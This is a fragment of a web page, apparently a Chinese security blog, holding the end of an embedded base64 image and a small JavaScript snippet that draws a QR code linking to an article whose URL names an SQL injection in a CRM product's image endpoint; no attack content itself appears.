LG/76QLL4hc+dwFsGAtuEwf7R8nmChDBrYY5rDzjORQfWwIzJrxCsTU77inXuKA5fsfdQDua1xHV7y0B60yt+/QR2A8lkV3i0TLQ1D/PTEA2YB4Y8ueBIFOcsF1nXJA4C9x/MYMNeC/tcND9BcJ+zmuyr4m4gZw2u3O+fwBgIeKLwGH+yrUwf3DexsPcBa8BY8zBzMMfSwp4TvzKtL0sO9rUwc+AYjKqPpU8wfMXkOoL7Adev329f9jVuyJft66/dzv8AAAD//3OPuYwAAAAGSURBVAMApunerc+N8VwAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-GetImage-MouldID-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 